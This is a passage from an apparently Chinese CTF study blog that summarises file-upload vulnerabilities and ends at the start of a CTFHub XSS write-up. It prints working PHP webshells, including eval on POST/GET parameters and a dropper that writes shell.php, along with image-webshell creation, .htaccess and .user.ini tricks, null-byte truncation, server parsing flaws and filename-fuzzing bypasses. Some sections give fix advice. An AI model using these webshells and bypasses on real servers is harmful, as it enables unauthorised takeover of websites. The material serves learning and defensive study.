@eval(phopinfo(););?&gt;</code></p><p>那么就会执行phpinfo()函数</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021911876.png"></p><p>然后我们还可以去进一步利用，比如通过system()函数，<code>key=system(ipconfig);</code>去查一下ip等等</p><p>不过最便捷的方法还是直接连接中国蚁剑，蚁剑必须要用$_POST的密码，这也是为什么我们优先用这个一句话木马。具体的连接方式请见upload-labs通关。</p><p>我们在upload-labs中还用到的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也都是同理。 </p><h2 id="文件上传详解"><a href="#文件上传详解" class="headerlink" title="文件上传详解"></a>文件上传详解</h2><h3 id="文件上传漏洞前提"><a href="#文件上传漏洞前提" class="headerlink" title="文件上传漏洞前提"></a>文件上传漏洞前提</h3><ol><li>文件可上传</li><li>上传路径可知</li><li>上传文件可以被解释执行或被包含</li></ol><h3 id="存在的风险点"><a href="#存在的风险点" class="headerlink" title="存在的风险点"></a>存在的风险点</h3><p>所有存在文件上传的地方都可能存在相关的漏洞，都可以进行测试，比如说上传头像、上传身份认证等</p><h3 id="文件上传测试思路及方法"><a href="#文件上传测试思路及方法" class="headerlink" title="文件上传测试思路及方法"></a>文件上传测试思路及方法</h3><p>对于上传点测试思路及其方法如下图，</p><p>思路：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021911630.png"></p><p>方法：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021911145.png"></p><h2 id="文件上传总结"><a href="#文件上传总结" class="headerlink" title="文件上传总结"></a>文件上传总结</h2><p>这里我们根据上面内容进行总结。</p><h3 id="js检查"><a href="#js检查" class="headerlink" title="js检查"></a>js检查</h3><p>在做文件上传题目时，我们应该直接上传不同的文件，去检测是否有过滤，但是同时也不能忘记查看一下前端代码，看看是否是前端过滤</p><p>如果是前端过滤，那么我们应该：</p><p>方法一：利用浏览器的机制可以禁用js</p><p>方法二：删除浏览器事件</p><p>这属于前端验证，下面我们讲后端验证</p><h3 id="检查后缀"><a href="#检查后缀" class="headerlink" title="检查后缀"></a>检查后缀</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>有可能是后缀黑名单，过滤了一部分上传的文件。</p><p>1、这里我们考虑上传特殊可解析后缀</p><p>常用过滤后缀：<code>php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml</code>。</p><p>下面我们详细讲解一下。</p><p>PHP是一种广泛使用的开放源代码的服务器端脚本语言，主要用于Web开发。默认情况下，PHP文件具有.php扩展名，但是服务器可以被配置为接受其他文件扩展名作为PHP文件来处理。以下是一些可能被服务器配置为识别并解析为PHP脚本的文件扩展名：</p><ul><li><p><strong>.php</strong> - 这是最常见的PHP文件扩展名。</p></li><li><p><strong>.php3</strong> - 早期的PHP版本使用的扩展名。</p></li><li><p><strong>.php4</strong> - 用于PHP 4.x系列。</p></li><li><p><strong>.php5</strong> - 用于PHP 5.x系列。</p></li><li><p><strong>.php7</strong> - 用于PHP 7.x系列。</p></li><li><p><strong>.php8</strong> - 用于PHP 8.x系列。</p></li><li><p><strong>.phtml</strong> - 这是PHP混合HTML文件使用的另一个旧扩展名。</p></li><li><p><strong>.phps</strong> - 用来显示源代码的高亮显示而不是执行它。</p></li><li><p><strong>.html or .htm</strong> - 有时服务器被配置为执行嵌入在HTML文件中的PHP代码。</p></li><li><p><strong>.inc</strong> - 有时用于包含文件，但这不是一个安全做法，因为它可能会暴露敏感代码。</p></li></ul><p><strong>但是注意利用特殊可解析后缀是有条件的：</strong></p><ul><li>服务器需要通过修改配置文件来支持上述其他扩展名。</li></ul><p>对于Apache服务器，这通常在<code>.htaccess</code>文件中或者直接在主配置文件<code>httpd.conf</code>中，使用<code>AddType</code>和<code>AddHandler</code>指令来完成。对于Nginx服务器，可以在<code>nginx.conf</code>中通过设置<code>location</code>块并使用<code>fastcgi_pass</code>指令来处理。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.php3</span> <span class="hljs-string">.php4</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.php6</span> <span class="hljs-string">.php7</span> <span class="hljs-string">.php8</span> <span class="hljs-string">.phtml</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>还有一些其他的从后缀下手的方法</p><ul><li>大小写绕过</li></ul><p>有时候没有对文件名进行强制小写转换，我们可以通过修改文件名为大写来绕过限制的</p><ul><li>空格绕过</li></ul><p>因为Windows特性，在文件资源管理器中对后缀名添加空格的操作是不允许的（会自动去除文件末尾的点和空格的），所以这里我们需要使用Burpsuite抓包修改文件名。</p><ul><li>点绕过</li></ul><p>windows环境时会自动去除文件末尾的点和空格的，所以还是bp抓包</p><ul><li><code>::$DATA</code>绕过</li></ul><p><strong>在windows环境下，不光会自动去除文件末尾的点和空格，同时(::$DATA)这个字符串，windows也会认为是非法字符，默认去除掉</strong></p><ul><li>双后缀名绕过</li></ul><p>有时候将危险后缀都替换为空，但又不是递归替换，所以我们可以双写绕过</p></li><li><p><code>.htaccess</code>文件解析漏洞</p></li></ol><p>像实际中我们并不能修改服务器配置文件，而开发人员又没有设置特殊可解析后缀。这时候我们往往需要利用.htaccess文件解析漏洞。</p><p>常见配法有以下几种：</p><pre><code class="hljs">AddHandler php5-script .jpgAddType application/x-httpd-php .jpgSethandler application/x-httpd-php</code></pre><p>Sethandler 将该目录及子目录的所有文件均映射为php文件类型。</p><p>Addhandler 使用 php5-script 处理器来解析所匹配到的文件。</p><p>AddType 将特定扩展名文件映射为php文件类型。</p><p>简单来说就是，可以将我们所的文件都解析成php或者是特定的文件解析为php。</p><p>那么我们创建一个.htaccess文件</p><p>写上内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Sethandler application/x-httpd-php<br></code></pre></td></tr></table></figure><p>这是将本目录及所有子目录的所有文件都解析为php文件。</p><p>然后我们就可以上传允许上传的内容，然后解析为php文件</p><p><strong>这里我们强调使用<code>.htaccess</code>的条件：</strong></p><ul><li>.htaccess针对Apache网络服务器</li></ul><ol start="5"><li><code>.user.ini</code>文件解析漏洞</li></ol><p>这时候我们先需要了解下面几个配置文件的区别</p><ul><li>php.ini</li></ul><blockquote><p>php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。<br>PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，.user.ini中设置。</p></blockquote><ul><li>.user.ini</li></ul><blockquote><p>.user.ini文件<br>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。<br>它比.htaccess(分布式配置文件)用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi(进程管理器)运行的php都可以用这个方法。<br>Php配置项中有两个比较有意思的项<br>auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。<br>auto_append_file类似，只是在文件后面包含。</p></blockquote><ul><li>.htaccess</li></ul><blockquote><p>.htaccess叫分布式配置文件，它提供了针对目录改变配置的方法——在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。并且子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。一般来说，如果你的虚拟主机使用的是Unix或Linux系统，或者任何版本的Apache网络服务器，从理论上讲都是支持.htaccess的。<br>目录规则:一般我们将.htaccess文件放置在网站的根目录，控制所在目录及所有子目录，而如果放置在子目录中，会受上级目录中.htaccess文件影响，是不起任何作用的。<br>.htaccess可以实现：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p></blockquote><p>所以.htaccess相对而言是比较针对Apache网络服务器，而.user.ini文件不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi(进程管理器)运行的php都可以用这个方法</p><p>user.ini ：自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用.htaccess文件有同样效果。</p><p>除了主php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP文件在 web 根目录之外，则只扫描该目录。</p><p>在.user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI设置可被识别。</p><p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p><p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p><p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p><p>我们可以用.user.ini去包含我们的代码，然后执行，.user.ini相当于一个用户自定义的php.ini。</p><p>制作一个.user.ini文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">auto_prepend_file=<span class="hljs-number">1</span>.jpg<br></code></pre></td></tr></table></figure><p>“auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数”</p><p>所以.user.ini文件里的意思是：所有的php文件都自动包含我们刚刚上传的1.jpg文件，会将其执行。</p><p><strong>这里我们强调使用.user.ini的条件：</strong></p><ul><li><p>以fastcgi(进程管理器)运行的php</p></li><li><p>上传路径下必须有PHP文件，用来包含我们的一句话木马</p></li></ul><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p>后端有可能是MIME检查，那我们就选择可以上传的MIME进行绕过</p><table><thead><tr><th>类型</th><th>描述</th><th>典型示例</th></tr></thead><tbody><tr><td>text</td><td>表明文件是普通文本，理论上是人类可读</td><td>text&#x2F;plain, text&#x2F;html, text&#x2F;css, text&#x2F;javascript</td></tr><tr><td>image</td><td>表明是某种图像。不包括视频，但是动态图（比如动态 gif）也使用 image 类型</td><td>image&#x2F;gif, image&#x2F;png, image&#x2F;jpeg, image&#x2F;bmp, image&#x2F;webp, image&#x2F;x-icon, image&#x2F;vnd.microsoft.icon</td></tr><tr><td>audio</td><td>表明是某种音频文件</td><td>audio&#x2F;midi, audio&#x2F;mpeg, audio&#x2F;webm, audio&#x2F;ogg, audio&#x2F;wav</td></tr><tr><td>video</td><td>表明是某种视频文件</td><td>video&#x2F;webm, video&#x2F;ogg</td></tr><tr><td>application</td><td>表明是某种二进制数据</td><td>application&#x2F;octet-stream, application&#x2F;pkcs12, application&#x2F;vnd.mspowerpoint, application&#x2F;xhtml+xml, application&#x2F;xml, application&#x2F;pdf</td></tr></tbody></table><p>•text&#x2F;html：HTML格式<br>•text&#x2F;plain：纯文本格式<br>•text&#x2F;xml：XML格式<br>•text&#x2F;css：CSS格式<br>•text&#x2F;javascript：JS格式<br>•image&#x2F;gif：GIF图片格式<br>•image&#x2F;jpeg：JPG图片格式<br>•image&#x2F;png：PNG图片格式<br>•image&#x2F;svg+xml：SVG矢量图格式<br>•video&#x2F;mpeg：MPEG动画格式<br>•application&#x2F;xhtml+xml：XHTML格式<br>•application&#x2F;xml：XML数据格式<br>•application&#x2F;json：JSON数据格式<br>•application&#x2F;atom+xml：Atom+XML聚合格式<br>•application&#x2F;pdf：PDF文档格式<br>•application&#x2F;msword：Word文档格式<br>•application&#x2F;octet-stream：二进制数据流（如常见的文件下载）<br>•application&#x2F;x-www-form-urlencoded：form表单被编码成key&#x2F;value格式发送到服务器（表单默认提交数据的格式）<br>•multipart&#x2F;form-data：POST 提交时伴随文件上传的表单</p><p>但是当使用MIME也无法绕过时，我们就要考虑别的方法。</p><p>比如说00截断。</p><blockquote><p>【00截断原理】</p><p>谈到00截断我们都会想到，有什么0x00截断、%00截断，也有人对两个东西分析一大堆，那么它俩有什么区别呢，什么场合适用哪一个呢？</p><p>这就要从00截断的原理说起：</p><p>其实截断的原理也很简单，无论0x00还是%00，最终被解析后都是一个东西:chr（0）。</p><p>char(0)是什么东西？</p><p>chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。</p><p>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符</p><p>而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</p><p>这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。</p><p>那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php</p></blockquote><p>至于是利用0x00还是%00，这就要看传递文件名时的方式</p><p>用GET传就用%00，用POST传就用0x00</p><blockquote><p>而空字符0x00怎么插入的呢？</p><p>通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了。</p><p>PS:这里的空格纯粹只是一个标记符号，便于我们找到位置，其实这里是什么字符都无所谓，只不过空格比较有特异性，方便在HEX中查找位置</p></blockquote><h3 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容"></a>检查内容</h3><p>有时候我们上传文件时，会检查文件中是否含有<code>&lt;?</code>,</p><p>这时候，我们就可以用如下木马：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>当然检查内容最常见的还是图片马，我们下面主要从图片马的角度讲解.</p><p><strong>注意图片马有利用条件：</strong></p><ul><li>有文件包含漏洞或者是可以上传<code>.user.ini</code>文件，才可以利用图片马</li></ul><ol><li>文件头检查</li></ol><p>PEG&#x2F;IFIF（常见的照片格式)：头两个字节为·0 xFF·0xD8。</p><p>PNG（无损压缩格式)：头两个字节为·0x89·0x50。</p><p>GIF（支持动画的图像格式)：头两个字节为·0x47·0x49。</p><p>BMP(Windows位图格式)：头两个字节为·0x42·0x4D。</p><p>在同时有图片和一句话木马的文件夹下打开cmd，然后使用以下命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">copy 图片名 /b + 一句话木马的文件名 /a webshell.jpg<br></code></pre></td></tr></table></figure><p>意思是将一句话木马文件中的代码追加到图片中并重新生成一个叫webshell.php的代码。</p><ol start="2"><li>getimagesize()</li></ol><p>getimagesize())会对目标的十六进制的前几个字符串进行读取。getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p><ol start="3"><li>exif_imagetype()</li></ol><p>exif_imagetype()读取一个图像的第一个字节并检查其后缀名。</p><p>还是可以用之前的图片马绕过</p><ol start="4"><li>二次渲染</li></ol><p>二次渲染会创建一个新图象，成功则返回图像标识符&#x2F;图像资源，失败则返回false，从而会导致图片马的数据丢失，上传的图片马无法执行。</p><p>二次渲染是后端重写文件内容，常见会用到的函数有：</p><pre><code class="hljs">basename(path[,suffix])没指定suffix则返回后缀名，有则不返回指定的后缀名 strrchr(string,char)函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。 imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像 imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像 imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像</code></pre><p>按照前面的方式上传，可以上传，但是包含漏洞无法解析。原因就是二次渲染将图片马里面的php代码打乱了。</p><p>这里我们需要使用二次渲染专用图。</p><p>具体制作二次渲染图片马的方式如下：</p><p><a href="https://xz.aliyun.com/news/2337#toc-6">https://xz.aliyun.com/news/2337#toc-6</a></p><h3 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h3><p>这里主要指条件竞争，主要是设计逻辑的问题，可以参考upload-labs第18、19关</p><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>count()函数漏洞是一个具体情境，这里就不进行总结，具体可看upload-labs第21关</p><h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><p>作者在总结文章时，发现其他人整理的其他绕过方法，这里简单列出，仅供参考。</p><h4 id="解压缩getshell"><a href="#解压缩getshell" class="headerlink" title="解压缩getshell"></a>解压缩getshell</h4><p>渗透的时候，有时候会需要后台通过上传压缩包进行部署的功能，上传成功后自解压到指定目录。</p><h4 id="解析漏洞详解"><a href="#解析漏洞详解" class="headerlink" title="解析漏洞详解"></a>解析漏洞详解</h4><p>参考文章：<a href="https://blog.csdn.net/zzz6583zz/article/details/141608529">https://blog.csdn.net/zzz6583zz/article/details/141608529</a></p><p>除了上面我们提到的两种解析漏洞，还有别的解析漏洞，我们这里对解析漏洞进行详解</p><p>解析漏洞解释：解析漏洞就是指服务器应用程序在解析某些精心构造的后缀文件的时候，会将相关的文件解析成网页的脚本，从而导致实现控制网站，同时大部分的解析漏洞都是由应用程序产生的。</p><p>一、IIS解析漏洞</p><ol><li>IIS5.0&#x2F;6.0</li></ol><ul><li>目录解析</li></ul><p>​在以. asp文件名的文件夹下的任何文件都将作为asp文件执行。<br>     也就是当目录为XX.asp的时候，那么当访问下面的图片的时候，如XX.aps&#x2F;1.jpg就会被当作ASP执行。</p><ul><li>文件解析</li></ul><p>​如果文件为1.asp;.jpg，由于IIS不解析;后面的内容，使用就会把文件当作1.asp进行解析，同时还存在.asa、.cer、.cdx可以进行解析。</p><ul><li>修复建议</li></ul><p>​ 1）限制上传目录的执行权限，不允许执行脚本。<br>   2）不允许创建目录。<br>   3）上传的文件进行重命名。</p><ol start="2"><li>IIS7.0&#x2F;IIS7.5</li></ol><ul><li>IIS7.0&#x2F;IIS7.5Fast-CGI</li></ul><p>​在Fast-CGI开启的状态下，在类似1.jpg后面加上&#x2F;1.php,变成&#x2F;1.jpg&#x2F;1.php路径会解析成PHP文件。需要进入php.ini里面修改cig.cgi_ pathinfo&#x3D;1。<br>   将1.txt文本文件中的后门代码写入到1.jpg图片的二进制代码：<br> copy 1.jpg&#x2F;b + 1.txt&#x2F;a 1.jpg<br>   1.txt的文件内容为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?P</span>HP <br>fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php eval($_POST[password])?&gt;&#x27;</span>);<br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>​当在图片文件中写入后门代码，当访问这个图片的时候加上&#x2F;.php的时候就会在当前目录下生成一句话木马shell.php。</p><ul><li>修复建议</li></ul><p>​配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序<br> <img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505041651602.png" alt="在这里插入图片描述"></p><p>二、apache解析漏洞</p><ol><li>apache解析漏洞</li></ol><ul><li><p>在apache1.x和apache2.x中存在解析漏洞。<br>   当一个文件为1.php.yy.xx的时候就会被当作php执行，这是由于在apache解析文件的时候有一个原则就是，以.后面的扩展名来解析，当遇见不认识的扩展名的时候，就会向前解析，直到遇到能够解析的后缀名为止。<br>  如：1.php.yy.xx，首先会解析xx，xx无法解析就会去解析yy，yy无法解析就会去解析php，那么php是能够解析了，那么就会结束。<br>  这种方式多用于绕过黑名单的检查。</p></li><li><p>修复建议</p></li></ul><p>​ 1）更新至最新版本。<br>   2）将上传的文件进行重命名。</p><p>三、nginx解析漏洞</p><ol><li>nginx&lt;8.03</li></ol><ul><li>nginx配置文件错误</li></ul><p>​由于nginx默认是用cgi解析php的，因此和iis一样可以制作图片马进行上传。<br>   当在图片文件中写入后门代码，当访问这个图片的时候加上&#x2F;.php的时候就会在当前目录下生成一句话木马shell.php。</p><ul><li>修复建议</li></ul><p>​1）配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序<br> <img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505041651060.png" alt="在这里插入图片描述"></p><p>​2）或如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。 或将上传存储的内容与网站分离，即站库分离。</p><p>​3）或高版本PHP提供了security.limit_extensions这个配置参数，设置security.limit_extensions &#x3D; .php</p><ol start="2"><li>nginx 0.5&#x2F;0.6&#x2F;0.7&lt;&#x3D;0.7.65&#x2F;0.8&lt;&#x3D;0.8.37</li></ol><ul><li>nginx空字节任意代码执行</li></ul><p>​当使用PHP-FastCGI执行PHP时，遇到url里面存在%00空字节时与FastCGI的处理不一致，导致可在非PHP文件中嵌入PHP代码，通过访问url+%00.PHP来执行其中的PHP代码。<br>   比如上传一张图片马1.jpg，那么当访问这个图片马的时在1.jpg后面添加%00.php就会将图片马以php执行。</p><ul><li>修复建议</li></ul><p>​1）升级nginx版本。</p><h4 id="名字改造"><a href="#名字改造" class="headerlink" title="名字改造"></a>名字改造</h4><p>一、filename改造</p><p>注意是对filename改造，不是对上传文件名改造</p><p>（1） 名字特殊符号替换以及构造异常闭合（符号方法很多自己天马星空，我这里就写几个就行了，但是要注意你改造了得让后端识别到，乱改造识别不到等于白搭）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;shell.jspx.jsp&#x27;</span><br><span class="hljs-attribute">filename</span>=shell.jspx.jsp<br><span class="hljs-attribute">filename</span>=shell.jspx.jsp&#x27;<br><span class="hljs-string">&quot;filename&quot;</span>=shell.jspx;<br></code></pre></td></tr></table></figure><p>（2）重写</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">filename</span><span class="hljs-operator">=</span>shell.jpg<span class="hljs-comment">;filename=shell.jspx;</span><br><span class="hljs-attribute">filename</span><span class="hljs-operator">=</span>shell.jspx<span class="hljs-comment">;filename=shell.jpg;</span><br></code></pre></td></tr></table></figure><p>（3）大小写变化</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">FileName</span>=shell.jspx.jsp&#x27;<br></code></pre></td></tr></table></figure><p>（4）参数污染</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">FileName=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaashell.jspx.jsp&#x27;<br>FileName =shell.jspx（加空格）<br>filename====<span class="hljs-string">&quot;shell.jspx.jsp1&quot;</span>（加等号）<br>FileName =shell.jspx（前后加空格，中间也可以加特殊符号fuzz）<br></code></pre></td></tr></table></figure><p>（5）文件名字编码（filename一般为后端接收参数，编码了可能识别不到，这个就看情况）</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">filename=<span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u006c</span><span class="hljs-symbol">\u006c</span><span class="hljs-symbol">\u002e</span><span class="hljs-symbol">\u006a</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0070</span><br></code></pre></td></tr></table></figure><p>（6）回车换行（有时候确实挺好用的，任意位置都可以试一下）</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">FileName</span><span class="hljs-operator">=</span>shell.jspx.<br>jsp<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">File</span><br><span class="hljs-keyword">Name</span>=shell.jspx.jsp<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>二、name改造</p><p>name也可以任意改造，改造的方法和filename差不多，就不重复发了，主要是思路重要。</p><p>其他的比如奇奇怪怪的正则需要用到的特殊字符都可以在文件名中fuzz一下，看看能否打断waf规则，也就是把我们fuzz后缀的再跑一次，或者再找点其他的正则字母，这里就不重复写了。</p><p>还有一些数据溢出啥的绕过方式，这里并不提及，读者可参考下文：</p><p><a href="https://blog.csdn.net/zzz6583zz/article/details/141608529">https://blog.csdn.net/zzz6583zz/article/details/141608529</a></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/HasntStartIsOver/article/details/130910722" title="WEB入门——文件上传漏洞_htaccess文件上传漏洞-CSDN博客">WEB入门——文件上传漏洞_htaccess文件上传漏洞-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_44268918/article/details/128074253" title="文件上传漏洞全解析：策略、绕过与安全修复-CSDN博客">文件上传漏洞全解析：策略、绕过与安全修复-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS-CTFHub</title>
    <link href="/2025/05/04/XSS-CTFHub/"/>
    <url>/2025/05/04/XSS-CTFHub/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145433520?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145433520?spm=1001.2014.3001.5501</a></p></blockquote><p>在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：<a href="https://www.ctfhub.com/#/index" title="CTFHub">CTFHub</a>。</p><p><strong>作者的CTFHub技能树汇总：</strong></p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142747270?spm=1001.2014.3001.5502" title="CTFHub技能树Web汇总-CSDN博客">CTFHub技能树Web汇总-CSDN博客</a></p><p>关于XSS，作者认为xss-labs是一个很好的靶场。作者通过该靶场训练到了XSS的大多数技巧。在应对CTFHub这些题型时就已经得心应手，推荐大家也做一下。</p><p>xss-labs的wp：<a href="https://blog.csdn.net/2302_81178149/article/details/142746914" title="xss-labs通关全详解_xsslabs-CSDN博客">xss-labs通关全详解_xsslabs-CSDN博客</a></p><p>XSS的技术总结：<a href="https://blog.csdn.net/2302_81178149/article/details/142746504" title="XSS学习总结-CSDN博客">XSS学习总结-CSDN博客</a></p><p><strong>注：如果想做本文的题目，可以自己搭建一个XSS接受平台或者是用在线的XSS平台。</strong></p><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>发现有两个表单</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022046854.png" alt="Image 16"></p><p>第一个表单用来试验，看是否有漏洞</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022046911.png" alt="Image 17"></p><p>从URL上发现原来是GET传参，也可以直接在URL上传参进行试验</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022046503.png" alt="Image 18"></p><p>第二个表单显示sent URL to bot，这是因为反射型XSS在用户点击后才会生效，但这道题没人点击我们生成的payload，只好发送给robot，让程序模拟用户点击，使我们的payload生效。</p><p>这里我们直接利用在线网站生成的payload，大家需用自己网站生成的的payload</p><p><img 